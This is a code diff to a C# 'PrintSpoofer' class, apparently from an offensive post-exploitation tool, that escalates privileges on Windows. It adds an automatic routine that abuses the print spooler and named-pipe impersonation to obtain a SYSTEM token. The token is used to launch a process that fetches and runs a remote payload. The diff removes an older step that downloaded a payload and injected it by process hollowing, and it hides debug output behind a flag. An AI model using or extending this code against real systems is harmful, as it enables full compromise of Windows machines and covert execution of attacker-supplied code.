@@ -14,6 +14,40 @@ internal static class PrintSpoofer
     const uint DEFAULT_TIMEOUT = 0;
     const uint TOKEN_ALL_ACCESS = 0xF01FF;
 
+    internal static async Task AutoSpoof(
+        string pipeName,
+        string payloadUrl,
+        string executeCmd = null
+    )
+    {
+        var canSpoof = UserHelper.CheckPrivileges().ContainsKey("SeImpersonatePrivilege");
+        if (!canSpoof)
+        {
+            Console.WriteLine("Cannot spoof - SeImpersonatePrivilege is not enabled");
+            return;
+        }
+
+        var computerName = Environment.MachineName;
+        var pipe = $"\\\\.\\pipe\\{pipeName}\\pipe\\spoolss";
+        byte[] commandBytes = Encoding.Unicode.GetBytes(
+            $"\\\\{computerName} \\\\{computerName}/pipe/{pipeName}"
+        );
+        var tasks = new List<Task>
+        { 
+            Task.Run(async () => await Spoof(pipe, payloadUrl, executeCmd)),
+            Task.Run(async () =>
+            {
+                await Task.Delay(1000);
+                SpoolSample.RDILoader.CallExportedFunction(
+                    SpoolSample.Data.RprnDll,
+                    "DoStuff",
+                    commandBytes
+                );
+            })
+        };
+        await Task.WhenAll(tasks);
+    }
+
     internal static async Task Spoof(string pipeName, string payloadUrl, string executeCmd = null)
     {
         var pipe = Lib.CreateNamedPipe(
@@ -26,13 +60,13 @@ internal static class PrintSpoofer
             DEFAULT_TIMEOUT,
             IntPtr.Zero
         );
-        Console.WriteLine("Created pipe {0} [{1}]", pipeName, pipe);
-        Console.WriteLine("Waiting for connection...");
+        PrintDebug($"Created pipe {pipeName} [{pipe}]");
+        PrintDebug("Waiting for connection...");
         Lib.ConnectNamedPipe(pipe, IntPtr.Zero);
-        Console.WriteLine("Connected to pipe {0}", pipeName);
+        PrintDebug($"Connected to pipe {pipeName}");
         Lib.ImpersonateNamedPipeClient(pipe);
         Lib.OpenThreadToken(Lib.GetCurrentThread(), TOKEN_ALL_ACCESS, false, out var hToken);
-        Console.WriteLine($"Got token 0x{hToken:X}");
+        PrintDebug($"Got token 0x{hToken:X}");
         int tokenInfoLength = 0;
         Lib.GetTokenInformation(
             hToken,
@@ -53,16 +87,16 @@ internal static class PrintSpoofer
             )
         )
         {
-            Console.WriteLine($"Got token info of length {tokenInfoLength}");
+            PrintDebug($"Got token info of length {tokenInfoLength}");
             var token = (TOKEN_USER?)Marshal.PtrToStructure(tokenInfo, typeof(TOKEN_USER));
             if (token != null)
             {
-                Console.WriteLine($"Got token user {token.Value.User.Sid}");
+                PrintDebug($"Got token user {token.Value.User.Sid}");
                 if (Lib.ConvertSidToStringSid(token.Value.User.Sid, out var ptrSid))
                 {
                     var sid = Marshal.PtrToStringAuto(ptrSid);
                     Marshal.FreeHGlobal(ptrSid);
-                    Console.WriteLine($"Found SID {sid}");
+                    PrintDebug($"Found SID {sid}");
                 }
                 Marshal.FreeHGlobal(tokenInfo);
                 Lib.DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out IntPtr hSystemToken);
@@ -71,15 +105,21 @@ internal static class PrintSpoofer
                 _ = Lib.CreateEnvironmentBlock(out nint env, hSystemToken, false);
 
                 var name = WindowsIdentity.GetCurrent().Name;
-                Console.WriteLine("Impersonated user is: " + name);
+                PrintDebug("Impersonated user is: {name}");
 
                 Lib.RevertToSelf();
                 var si = new STARTUPINFO();
                 si.cb = Marshal.SizeOf(si);
                 si.lpDesktop = "WinSta0\\Default";
                 var binary = string.IsNullOrEmpty(executeCmd)
-                    ? Obfuscation.GetObfuscatedBinaryName()
+                    ? $"{Environment.ProcessPath} sc --payload {payloadUrl}"
                     : executeCmd;
+
+                if (RuntimeConfig.IsDebugEnabled)
+                {
+                    PrintDebug($"Executing \"{binary}\" as {name}");
+                }
+
                 Lib.CreateProcessWithTokenW(
                     hSystemToken,
                     (uint)LogonFlags.WithProfile,
@@ -92,24 +132,21 @@ internal static class PrintSpoofer
                     out ProcessInformation pi
                 );
 
-                if (!string.IsNullOrEmpty(payloadUrl))
-                {
-                    if (RuntimeConfig.IsDebugEnabled)
-                        Console.WriteLine($"Downloading payload from {payloadUrl}");
-                    var httpClient = new HttpClient();
-                    var data = await httpClient.GetStringAsync(payloadUrl);
-                    if (RuntimeConfig.IsDebugEnabled)
-                        Console.WriteLine($"Downloaded {data.Length} bytes");
-                    var buf = Decoder.DecodeString(data);
-                    if (RuntimeConfig.IsDebugEnabled)
-                        Console.WriteLine($"Decrypted payload to {buf.Length} bytes");
-                    await HollowProcess.Run(buf, pi);
-                }
+                if (pi.dwProcessId != 0)
+                    PrintDebug($"Impersonation was successful - PID: {pi.dwProcessId}");
+
+                Lib.DisconnectNamedPipe(pipe);
             }
             else
             {
-                Console.WriteLine("Failed to get token user");
+                PrintDebug("Failed to get token user");
             }
         }
+    }
+
+    private static void PrintDebug(string message)
+    {
+        if (RuntimeConfig.IsDebugEnabled)
+            Console.WriteLine(message);
     }
 }
